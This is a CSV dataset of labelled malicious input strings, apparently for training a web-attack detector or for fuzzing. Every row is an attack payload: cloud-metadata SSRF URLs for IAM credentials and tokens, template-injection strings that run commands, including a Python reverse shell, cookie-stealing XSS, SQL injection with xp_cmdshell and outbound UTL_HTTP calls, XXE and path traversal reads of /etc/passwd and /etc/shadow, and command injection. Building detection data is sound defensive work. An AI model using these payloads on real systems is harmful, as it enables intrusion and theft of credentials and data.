Sentence,Label
http :  /   / 169.254.169.254 / metadata / v1 / maintenance,1
http :  /   / 169.254.169.254 / latest / meta-data / iam / security-credentials / ,1
http :  /   / 169.254.169.254 / latest / dynamic / instance-identity / document,1
http :  /   / 169.254.169.254 / latest / meta-data / iam / security-credentials / aws-elasticbeanorastalk-ec2-role,1
http :  /   / 169.254.169.254 / latest / meta-data / iam / security-credentials / aws-elasticbeanorastalk-ec2-role,1
http :  /   / localhost:9001 / 2018-06-01 / runtime / invocation / next,1
http :  /   / 169.254.169.254 / computeMetadata / v1 / ,1
http :  /   / metadata.google.internal / computeMetadata / v1 / ,1
http :  /   / metadata / computeMetadata / v1 / ,1
http :  /   / metadata.google.internal / computeMetadata / v1 / instance / hostname,1
http :  /   / metadata.google.internal / computeMetadata / v1 / instance / id,1
http :  /   / metadata.google.internal / computeMetadata / v1 / project / project-id,1
http :  /   / metadata.google.internal / computeMetadata / v1 / instance / disks / ?recursive = true,1
http :  /   / metadata.google.internal / computeMetadata / v1beta1 / project / attributes / ssh-keys?alt = json,1
http :  /   / metadata.google.internal / computeMetadata / v1beta1 / instance / service-accounts / default / token,1
http :  /   / metadata.google.internal / computeMetadata / v1beta1 / instance / attributes / kube-env?alt = json,1
http :  /   / 169.254.169.254 / metadata / v1 / id,1
http :  /   / 169.254.169.254 / metadata / v1 / user-data,1
http :  /   / 169.254.169.254 / metadata / v1.json,1
http :  /   / 169.254.169.254 / metadata / v1 / maintenance,1
http :  /   / 169.254.169.254 / openstack,1
http :  /   / 169.254.169.254 / 2009-04-04 / meta-data /  ,1
http :  /   / 192.0.0.192 / latest / ,1
http :  /   / 192.0.0.192 / latest / user-data / ,1
http :  /   / 192.0.0.192 / latest / meta-data / ,1
http :  /   / 192.0.0.192 / latest / attributes / ,1
http :  /   / 100.100.100.200 / latest / meta-data / ,1
http :  /   / 100.100.100.200 / latest / meta-data / instance-id,1
http :  /   / 100.100.100.200 / latest / meta-data / image-id,1
http :  /   / 127.0.0.1:2379 / version,1
http :  /   / 127.0.0.1:2379 / v2 / keys / ,1
http :  /   / 127.0.0.1:2375 / v1.24 / containers / json,1
WEB-INF / web.xml,1
WEB-INF \ web.xml,1
 / WEB-INF / web.xml,1
 \ WEB-INF \ web.xml,1
  {   {  2*2 }  }  [  [ 3*3 ]  ] ,1
  {   {  3*3 }  } ,1
  {   {  3*'3' }  } ,1
 < % =  3 * 3 % > ,1
$ { 6*6 } ,1
$  {   {  3*3 }  } ,1
@ ( 6+5 ) ,1
# { 3*3 } ,1
# {  3 * 3  } ,1
  {   {  dump ( app )  }  } ,1
"  {   {  app.request.server.all | join ( ',' )  }  } ",1
  {   {  config.items (  )  }  } ,1
  {   {    [  ] .class.base.subclasses (  )   }  } ,1
  {   {  ''.class.mro (  )  [ 1 ] .subclasses (  )  }  } ,1
  {   {   ''.__class__.__mro__ [ 2 ] .__subclasses__ (  )   }  } ,1
" { % for key, value in config.iteritems (  )  % }  < dt >   {   {   key | e  }  }  <  / dt >  < dd >   {   {   value | e  }  }  <  / dd >  { % endfor % } ",1
  {   {  'a'.toUpperCase (  )  }  }  ,1
  {   {   request  }  } ,1
  {   {  self }  } ,1
 < % =  File.open ( ' / etc / passwd' ) .read % > ,1
" < #assign ex  =  ""freemarker.template.utility.Execute""?new (  )  > $ {  ex ( ""id"" )  } ",1
 [ #assign ex  =  'freemarker.template.utility.Execute'?new (  )  ] $ {  ex ( 'id' )  } ,1
"$ { ""freemarker.template.utility.Execute""?new (  )  ( ""id"" )  } ",1
"  {   {  app.request.query.filter ( 0,0,1024, { 'options':'system' }  )  }  } ",1
  {   {   ''.__class__.__mro__ [ 2 ] .__subclasses__ (  )  [ 40 ]  ( ' / etc / passwd' ) .read (  )   }  } ,1
"  {   {   config.items (  )  [ 4 ]  [ 1 ] .__class__.__mro__ [ 2 ] .__subclasses__ (  )  [ 40 ]  ( "" / etc / passwd"" ) .read (  )   }  } ",1
"  {   {  ''.__class__.mro (  )  [ 1 ] .__subclasses__ (  )  [ 396 ]  ( 'cat  / etc / passwd',shell = True,stdout = -1 ) .communicate (  )  [ 0 ] .strip (  )  }  } ",1
  {   {  config.__class__.__init__.__globals__ [ 'os' ] .popen ( 'ls' ) .read (  )  }  } ,1
" { % for x in  (  ) .__class__.__base__.__subclasses__ (  )  % }  { % if ""warning"" in x.__name__ % }   {   {  x (  ) ._module.__builtins__ [ '__import__' ]  ( 'os' ) .popen ( request.args.input ) .read (  )  }  }  { %endif% }  { %endfor% } ",1
 { $smarty.version } ,1
 { php } echo `id` ;  {  / php } ,1
  {   {   [ 'id' ]  | filter ( 'system' )  }  } ,1
  {   {   [ 'cat \ x20 / etc / passwd' ]  | filter ( 'system' )  }  } ,1
  {   {   [ 'cat$IFS / etc / passwd' ]  | filter ( 'system' )  }  } ,1
"  {   {  request | attr (  [ request.args.usc*2,request.args.class,request.args.usc*2 ]  | join )  }  } ",1
"  {   {  request | attr (  [ ""_""*2,""class"",""_""*2 ]  | join )  }  } ",1
"  {   {  request | attr (  [ ""__"",""class"",""__"" ]  | join )  }  } ",1
"  {   {  request | attr ( ""__class__"" )  }  } ",1
  {   {  request.__class__ }  } ,1
  {   {  request | attr ( 'application' )  | attr ( ' \ x5f \ x5fglobals \ x5f \ x5f' )  | attr ( ' \ x5f \ x5fgetitem \ x5f \ x5f' )  ( ' \ x5f \ x5fbuiltins \ x5f \ x5f' )  | attr ( ' \ x5f \ x5fgetitem \ x5f \ x5f' )  ( ' \ x5f \ x5fimport \ x5f \ x5f' )  ( 'os' )  | attr ( 'popen' )  ( 'id' )  | attr ( 'read' )  (  )  }  } ,1
"  {   {  'a'.getClass (  ) .forName ( 'javax.script.ScriptEngineManager' ) .newInstance (  ) .getEngineByName ( 'JavaScript' ) .eval (  \ ""new java.lang.String ( 'xxx' )  \ "" )  }  } ",1
"  {   {  'a'.getClass (  ) .forName ( 'javax.script.ScriptEngineManager' ) .newInstance (  ) .getEngineByName ( 'JavaScript' ) .eval (  \ ""var x = new java.lang.ProcessBuilder ;  x.command (  \  \  \ ""whoami \  \  \ "" )  ;  x.start (  )  \ "" )  }  } ",1
"  {   {  'a'.getClass (  ) .forName ( 'javax.script.ScriptEngineManager' ) .newInstance (  ) .getEngineByName ( 'JavaScript' ) .eval (  \ ""var x = new java.lang.ProcessBuilder ;  x.command (  \  \  \ ""netstat \  \  \ "" )  ;  org.apache.commons.io.IOUtils.toString ( x.start (  ) .getInputStream (   )  )   \ "" )  }  } ",1
"  {   {  'a'.getClass (  ) .forName ( 'javax.script.ScriptEngineManager' ) .newInstance (  ) .getEngineByName ( 'JavaScript' ) .eval (  \ ""var x = new java.lang.ProcessBuilder ;  x.command (  \  \  \ ""uname \  \  \ "", \  \  \ ""-a \  \  \ "" )  ;  org.apache.commons.io.IOUtils.toString ( x.start (  ) .getInputStream (   )  )   \ "" )  }  } ",1
" { % for x in  (  ) .__class__.__base__.__subclasses__ (  )  % }  { % if ""warning"" in x.__name__ % }   {   {  x (  ) ._module.__builtins__ [ '__import__' ]  ( 'os' ) .popen ( ""python3 -c 'import socket,subprocess,os ; s = socket.socket ( socket.AF_INET,socket.SOCK_STREAM )  ; s.connect  (  (   \ ""ip \ "",4444  )  )   ; os.dup2 ( s.fileno (  ) ,0 )  ;  os.dup2 ( s.fileno (  ) ,1 )  ;  os.dup2 ( s.fileno (  ) ,2 )  ; p = subprocess.call (  [  \ "" / bin / cat \ "",  \ ""flag.txt \ "" ]  )  ; '"" ) .read (  ) .zfill ( 417 )  }  }  { %endif% }  { % endfor % } ",1
$ { T ( java.lang.System ) .getenv (  )  } ,1
$ { T ( java.lang.Runtime ) .getRuntime (  ) .exec ( 'cat etc / passwd' )  } ,1
$ { T ( org.apache.commons.io.IOUtils ) .toString ( T ( java.lang.Runtime ) .getRuntime (  ) .exec ( T ( java.lang.Character ) .toString ( 99 ) .concat ( T ( java.lang.Character ) .toString ( 97  )  )  .concat ( T ( java.lang.Character ) .toString ( 116  )  )  .concat ( T ( java.lang.Character ) .toString ( 32  )  )  .concat ( T ( java.lang.Character ) .toString ( 47  )  )  .concat ( T ( java.lang.Character ) .toString ( 101  )  )  .concat ( T ( java.lang.Character ) .toString ( 116  )  )  .concat ( T ( java.lang.Character ) .toString ( 99  )  )  .concat ( T ( java.lang.Character ) .toString ( 47  )  )  .concat ( T ( java.lang.Character ) .toString ( 112  )  )  .concat ( T ( java.lang.Character ) .toString ( 97  )  )  .concat ( T ( java.lang.Character ) .toString ( 115  )  )  .concat ( T ( java.lang.Character ) .toString ( 115  )  )  .concat ( T ( java.lang.Character ) .toString ( 119  )  )  .concat ( T ( java.lang.Character ) .toString ( 100  )  )   ) .getInputStream (   )  )   } ,1
FSCommand,1
onAbort,1
onActivate,1
onAfterPrint,1
onAfterUpdate,1
onBeforeActivate,1
onBeforeCopy,1
onBeforeCut,1
onBeforeDeactivate,1
onBeforeEditFocus,1
onBeforePaste,1
onBeforePrint,1
onBeforeUnload,1
onBeforeUpdate,1
onBegin,1
onBlur,1
onBounce,1
onCellChange,1
onChange,1
onClick,1
onContextMenu,1
onControlSelect,1
onCopy,1
onDataAvailable,1
onDataSetChanged,1
onDataSetComplete,1
onDblClick,1
onDeactivate,1
onDrag,1
onDragDrop,1
onDragEnd,1
onDragEnter,1
onDragLeave,1
onDragOver,1
onDragStart,1
onDrop,1
onError,1
onErrorUpdate,1
onFilterChange,1
onFinish,1
onFocus,1
onFocusIn,1
onFocusOut,1
onHashChange,1
onHelp,1
onInput,1
onKeyDown,1
onKeyPress,1
onKeyUp,1
onLayoutComplete,1
onLoad,1
onLoseCapture,1
onMediaComplete,1
onMediaError,1
onMessage,1
onMouseDown,1
onMouseEnter,1
onMouseLeave,1
onMouseMove,1
onMouseOut,1
onMouseOver,1
onMouseUp,1
onMouseWheel,1
onMove,1
onMoveEnd,1
onMoveStart,1
onOffline,1
onOnline,1
onOutOfSync,1
onPaste,1
onPause,1
onPopState,1
onProgress,1
onPropertyChange,1
onReadyStateChange,1
onRedo,1
onRepeat,1
onReset,1
onResize,1
onResizeEnd,1
onResizeStart,1
onResume,1
onReverse,1
onRowDelete,1
onRowExit,1
onRowInserted,1
onRowsEnter,1
onScroll,1
onSeek,1
onSelect,1
onSelectStart,1
onSelectionChange,1
onStart,1
onStop,1
onStorage,1
onSubmit,1
onSyncRestored,1
onTimeError,1
onTrackChange,1
onURLFlip,1
onUndo,1
onUnload,1
seekSegmentTime,1
"http :  /   / www.bing.com / search?q =  < html >  < head >  < meta http-equiv =  \ ""refresh \ "" content =  \ ""5 ;  url = http :  /   / xss.cx /  \ "" >  < title > Loading <  / title > ",1
" <  / head >  \ n < body >  < form method =  \ ""post \ "" action =  \ ""http :  /   / xss.cx /  \ "" target =  \ ""_top \ "" id =  \ ""rf \ "" >  < input type =  \ ""hidden \ "" name =  \ ""ic \ "" value =  \ ""0 \ "" > ",1
" < input type =  \ ""hidden \ "" name =  \ ""fb \ "" value =  \ ""true \ "" /  >  <  / form >  \ n < script > !function ( e,t )  { var n,i ; return!e.navigator & form = ## & sc = # & sp = -# & qs = n & sk = z",1
!@#$%%^#$%#$@#$%$$@#$%^^**  (  (   ) ,1
!@#0%^#0##018387@#0^^**  (  (   ) ,1
""" or ""a"" = ""a",1
""" or ""x"" = ""x",1
""" or 0 = 0 #",1
""" or 0 = 0 --",1
""" or 1 = 1 or """" = """,1
""" or 1 = 1--",1
"""' or 1 --'""",1
""" )  or  ( ""a"" = ""a",1
""" < ?xml version = """"1.0"""" encoding = """"ISO-8859-1""""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM """"file :  /   /  /  / dev / random"""" >  ]  >  < foo >  & xxe ;  <  / foo > """,1
""" < ?xml version = """"1.0"""" encoding = """"ISO-8859-1""""? >  < !DOCTYPE foo  [  < !ELEMENT foo ANY >  < !ENTITY xxe SYSTEM """"file :  /   /  /  / etc / passwd"""" >  ]  >  < foo >  & xxe ;  <  / foo > """,1
""" < ?xml version = """"1.0"""" encoding = """"ISO-8859-1""""? >  < foo >  < ! [ CDATA [ ' or 1 = 1 or '' = ' ]  ]  >  <  / foo > """,1
""" < ?xml version = """"1.0"""" encoding = """"ISO-8859-1""""? >  < foo >  < ! [ CDATA [  <  ]  ]  > SCRIPT < ! [ CDATA [  >  ]  ]  > alert ( 'XSS' )  ;  < ! [ CDATA [  <  ]  ]  >  / SCRIPT < ! [ CDATA [  >  ]  ]  >  <  / foo > """,1
""" < HTML xmlns:xss >  < ?import namespace = """"xss"""" implementation = """"http :  /   / ha.ckers.org / xss.htc"""" >  < xss:xss > XSS <  / xss:xss >  <  / HTML > """,1
""" < xml ID = """"xss"""" >  < I >  < B >  < IMG SRC = """"javas < !-- -- > cript:alert ( 'XSS' ) """" >  <  / B >  <  / I >  <  / xml >  < SPAN DATASRC = """"#xss"""" DATAFLD = """"B"""" DATAFORMATAS = """"HTML"""" >  <  / SPAN >  <  / C >  <  / X >  <  / xml >  < SPAN DATASRC = #I DATAFLD = C DATAFORMATAS = HTML >  <  / SPAN > """,1
""" < xml ID = I >  < X >  < C >  < ! [ CDATA [  < IMG SRC = """"javas ]  ]  >  < ! [ CDATA [ cript:alert ( 'XSS' )  ; """" >  ]  ]  > """,1
""" >  < script > """,1
""" >  < script > alert ( 1 )  <  / script > ",1
""" >  < script > document.location = 'http :  /   / your.site.com / cgi-bin / cookie.cgi?'+document.cookie <  / script > ",1
""" > xxx < P > yyy",1
""" \ t""",1
# & apos ; ,1
#xA#xD,1
#xD#xA,1
%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%,1
%00 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd,1
%00 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / shadow,1
%00 / ,1
%00 / etc / passwd%00,1
%01%02%03%04%0a%0d%0aADSF,1
%0A / usr / bin / id,1
%0A / usr / bin / id%0A,1
%0Aid%0A,1
%0a ping -i 30 127.0.0.1 %0a,1
%oa ping -n 30 127.0.0.1 %0a,1
%0a id %0a,1
%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+ < youremail > %0aRCPT+TO:+ < youremail > %0aDATA%0aFrom:+ < youremail > %0aTo:+ < youremail > %0aSubject:+tst%0afoo%0a%2e%0a,1
%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+ < youremail > %0d%0aRCPT+TO:+ < youremail > %0d%0aDATA%0d%0aFrom:+ < youremail > %0d%0aTo:+ < youremail > %0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a,1
%0d%0aX-Injection-Header: AttackValue,1
 $ ( sleep 50 ) ,1
 'sleep 50',1
%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27 %2Bdocument%2Ecookie%3C%2Fscript%3E,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00,1
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
%27 or 1 = 1,1
%2A%28%7C%28mail%3D%2A%29%29,1
%2A%28%7C%28objectclass%3D%2A%29%29,1
%2A%7C,1
%2e%2e%2f,1
%3C%3F,1
%3Cscript%3Ealert ( %22X SS%22 )  ; %3C / script%3E,1
"%3cscript%3ealert ( ""XSS"" )  ; %3c / script%3e",1
%3cscript%3ealert ( document.cookie )  ; %3c%2fscript%3e,1
%5C / ,1
%99999999999s,1
%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A,1
%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E,1
%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F,1
%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G,1
%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X,1
%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a,1
%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d ,1
%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e,1
%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f,1
%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g,1
%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i,1
%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o,1
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p,1
%s%p%x%d,1
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s,1
%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u,1
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x,1
 &  id,1
 &  ping -i 30 127.0.0.1  & ,1
 &  ping -n 30 127.0.0.1  & ,1
 & #0000060,1
 & #0000060 ; ,1
 & #000060,1
 & #000060 ; ,1
 & #00060,1
 & #00060 ; ,1
 & #0060,1
 & #0060 ; ,1
 & #060,1
 & #060 ; ,1
 & #10 ; ,1
 & #10 ;  & #13 ; ,1
 & #13 ; ,1
 & #13 ;  & #10 ; ,1
 & #60,1
 & #60 ; ,1
 & #X000003C,1
 & #X000003C ; ,1
 & #X000003c,1
 & #X000003c ; ,1
 & #X00003C,1
 & #X00003C ; ,1
 & #X00003c,1
 & #X00003c ; ,1
 & #X0003C,1
 & #X0003C ; ,1
 & #X0003c,1
 & #X0003c ; ,1
 & #X003C,1
 & #X003C ; ,1
 & #X003c,1
 & #X003c ; ,1
 & #X03C,1
 & #X03C ; ,1
 & #X03c,1
 & #X03c ; ,1
 & #X3C,1
 & #X3C ; ,1
 & #X3c,1
 & #X3c ; ,1
 & #x000003C,1
 & #x000003C ; ,1
 & #x000003c,1
 & #x000003c ; ,1
 & #x00003C,1
 & #x00003C ; ,1
 & #x00003c,1
 & #x00003c ; ,1
 & #x0003C,1
 & #x0003C ; ,1
 & #x0003c,1
 & #x0003c ; ,1
 & #x003C,1
 & #x003C ; ,1
 & #x003c,1
 & #x003c ; ,1
 & #x03C,1
 & #x03C ; ,1
 & #x03c,1
 & #x03c ; ,1
 & #x3C,1
 & #x3C ; ,1
 & #x3c,1
 & #x3c ; ,1
 & LT ; ,1
 & apos ; ,1
 & apos ;  OR,1
 & lt ; ,1
 & lt ; !--#exec cmd =  & quot ;  / bin / cat  / etc / passwd & quot ; -- & gt ; ,1
 & lt ; !--#exec cmd =  & quot ;  / bin / cat  / etc / shadow & quot ; -- & gt ; ,1
 & lt ; !--#exec cmd =  & quot ;  / usr / bin / id ; -- & gt ; ,1
 & lt ;  & gt ;  & quot ; '% ;  )  (  & amp ; +,1
 & ltscript & gtalert ( document.cookie )  ;  & ltscript & gtalert,1
 & ltscript & gtalert ( document.cookie )  ;  <  / script > ,1
 & quot ;  ; id & quot ; ,1
'  ( select top 1,1
' UNION ALL SELECT,1
' UNION SELECT,1
' or '' = ',1
' or '1' = '1,1
' or '1' = '1'--,1
' or 'x' = 'x,1
' or  ( EXISTS ) ,1
' or 0 = 0 #,1
' or 0 = 0 --,1
' or 1 in  ( @@version ) --,1
' or 1 = 1 or '' = ',1
' or 1 = 1--,1
' or a = a--,1
' or uid like '%,1
' or uname like '%,1
' or user like '%,1
' or userid like '%,1
' or username like '%,1
' or 1 = 1,1
'%3CIFRAME SRC = javascript:alert ( %2527XSS%2527 ) %3E%3C / IFRAME%3E,1
"'' ; !--"" < XSS >  =  &  {  (  )  } ",1
' )  or  ( 'a' = 'a,1
' ;  exec master..xp_cmdshell,1
' ;  exec xp_regread,1
' ;  waitfor delay '0:30:0'--,1
"' ; alert ( String.fromCharCode ( 88,83,83  )  )   /  /  \ ' ; alert ( String.fromCharCode ( 88,83,83  )  )   /  / "" ; alert ( String.fromCharCode ( 88,83,83  )  )   /  /  \ "" ; alert ( String.fromCharCode ( 88,83,83  )  )   /  /  >  <  / SCRIPT > !-- < SCRIPT > alert ( String.fromCharCode ( 88,83,83  )  )   <  / SCRIPT >  =  &  {  } ",1
' ; shutdown--,1
' >  < script > alert ( document.cookie )  ;  <  / script > ,1
' >  < script > alert ( document.cookie )  <  / script > ,1
'hi' or 'x' = 'x' ; ,1
'or select *,1
'sqlattempt1,1
' |  | UTL_HTTP.REQUEST,1
' |  | Utl_Http.request ( 'http :  /   /  < yourservername > ' )  from dual--,1
 ( ' ) ,1
 ( sqlattempt2 ) ,1
  )  )    )  )    )  )    )  )    )  )  ,1
* & apos ; ,1
* (  |  ( mail = *  )  )  ,1
* (  |  ( objectclass = *  )  )  ,1
",@variable",1
--' ; ,1
--sp_password,1
-268435455,1
..%%35%63,1
..%%35c,1
..%25%35%63,1
..%255c,1
..%bg%qf,1
..%c0%af,1
..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  boot.ini,1
..%u2215,1
..%u2216,1
 . .  /  ,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / hosts,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / hosts%00,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd%00,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / shadow,1
 . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / shadow%00,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ passwd,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ passwd%00,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ shadow,1
..  \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .   \  . .  \ etc \ shadow%00,1
. \  \ . / . \  \ . / . \  \ . / . \  \ . / . \  \ . / . \  \ . / etc / passwd,1
. \  \ . / . \  \ . / . \  \ . / . \  \ . / . \  \ . / . \  \ . / etc / shadow,1
 / %00 / ,1
 / %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
 / %2A,1
 / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / etc / passwd,1
 / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / %2e%2e / etc / shadow,1
 /  & apos ; ,1
" / ,%ENV, / ",1
 / ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  etc / passwd,1
 / ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  ..%c0%af . .  /  etc / shadow,1
 / . . .  /  . . .  /  . . .  /  . . .  /  . . .  /  ,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  %2A,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd%00.html,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd%00.jpg,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / passwd^^,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / shadow,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  etc / shadow^^,1
 /  . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /   . .  /  bin / id | ,1
 / .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  boot.ini,1
 / .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  etc / passwd,1
 / .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  .. \  . .  /  etc / shadow,1
 / . / . / . / . / . / . / . / . / . / . / . / etc / passwd,1
 / . / . / . / . / . / . / . / . / . / . / . / etc / shadow,1
 /  / ,1
